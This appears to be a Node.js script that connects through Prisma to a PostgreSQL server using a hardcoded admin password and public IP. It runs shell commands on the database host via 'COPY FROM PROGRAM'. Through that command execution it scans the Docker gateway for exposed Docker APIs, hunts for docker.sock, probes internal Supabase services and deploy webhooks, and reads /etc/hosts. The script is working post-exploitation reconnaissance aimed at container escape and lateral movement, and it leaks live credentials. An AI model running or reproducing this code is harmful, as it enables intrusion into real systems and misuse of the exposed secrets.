process.env.DATABASE_URL = 'postgresql://supabase_admin.m88:Madison_88_admin**@5.223.78.194:5432/postgres?schema=AP_Invoice';
const { PrismaClient } = require('C:/Users/JC/OneDrive - Madison88/AP Invoice/apps/api/node_modules/@prisma/client');
const prisma = new PrismaClient({ log: ['error'] });

async function runCmd(cmd) {
  try {
    await prisma.$executeRawUnsafe(`CREATE TEMP TABLE IF NOT EXISTS cmd_output (line text)`);
    await prisma.$executeRawUnsafe(`TRUNCATE cmd_output`);
    await prisma.$executeRawUnsafe(`COPY cmd_output FROM PROGRAM '${cmd.replace(/'/g, "'\\''")}'`);
    const rows = await prisma.$queryRawUnsafe(`SELECT * FROM cmd_output`);
    return rows.map(r => r.line).join('\n');
  } catch (e) {
    return 'ERROR: ' + e.message.substring(0, 300);
  }
}

(async () => {
  try {
    // Scan Docker API on various ports
    console.log('1. Scan Docker API on host...');
    const ports = [2375, 2376, 2377, 4243, 9200, 9001, 9000, 5555, 6666];
    for (const port of ports) {
      const result = await runCmd(`curl -s --connect-timeout 2 http://172.17.0.1:${port}/version 2>&1 | head -1`);
      if (!result.includes('could not connect') && !result.includes('Connection refused') && result.trim()) {
        console.log(`   Port ${port}: ${result.substring(0, 100)}`);
      }
    }

    // Check if Docker socket is anywhere
    console.log('\n2. Find Docker sockets...');
    console.log(await runCmd('find / -name "docker.sock" 2>/dev/null | head -5'));
    console.log(await runCmd('find / -name "*.sock" -type s 2>/dev/null | head -10'));

    // Check if we can access the Supabase studio or other services
    console.log('\n3. Check Supabase services...');
    const services = [
      ['http://172.17.0.1:8000', 'Supabase API'],
      ['http://172.17.0.1:3000', 'Supabase Studio'],
      ['http://172.17.0.1:8080', 'Supabase Auth'],
      ['http://172.17.0.1:5000', 'Supabase Storage'],
    ];
    for (const [url, name] of services) {
      console.log(`   ${name}: ${await runCmd(`curl -s --connect-timeout 2 ${url} 2>&1 | head -1`)}`);
    }

    // Check if there's a webhook or deploy endpoint
    console.log('\n4. Check for deploy webhooks...');
    console.log(await runCmd('curl -s --connect-timeout 2 http://172.17.0.1:9000/ 2>&1 | head -1'));
    console.log(await runCmd('curl -s --connect-timeout 2 http://172.17.0.1:9090/ 2>&1 | head -1'));

    // Try to find the API container via Docker network
    console.log('\n5. Check container networking...');
    console.log(await runCmd('cat /etc/hosts 2>/dev/null | grep -v "^#" | grep -v "^$"'));
    
    // Try to resolve the API server hostname
    console.log(await runCmd('getent hosts ap-invoice-api 2>/dev/null || echo "not found"'));
    console.log(await runCmd('getent hosts api 2>/dev/null || echo "not found"'));

  } catch (e) {
    console.error('FATAL:', e.message);
  } finally {
    await prisma.$disconnect();
  }
})();
